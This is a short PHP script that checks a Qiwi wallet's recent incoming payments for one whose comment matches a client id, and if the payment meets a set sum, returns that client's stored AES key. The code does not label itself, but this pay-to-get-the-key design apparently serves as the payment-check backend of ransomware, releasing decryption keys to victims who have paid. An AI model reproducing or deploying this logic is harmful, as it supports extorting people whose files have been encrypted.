<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	require_once realpath(dirname(__FILE__)) . '/../lib/Qiwi.php';
	
	$qiwi = new Qiwi(QIWI_PHONE, QIWI_TOKEN);
	
	$getHistory = $qiwi->getPaymentsHistory([
		'rows' => 50
	]);
	
	if(empty($_GET["uid"])) {
		echo "false";
		return;
	}

	$client = get_client($_GET["uid"])[0];
	
	foreach($getHistory["data"] as $transaction) {
		
		if($transaction["status"] == "SUCCESS" and $transaction["type"] == "IN") {
			if($transaction["sum"]["amount"] >= PAYMENT_SUM) {
				if($transaction["comment"] == $client["id"]) {
					echo "true|" . $client["aeskey"];
					exit();
				}
				
			}
		}
	}
	
	echo "false|0";
?>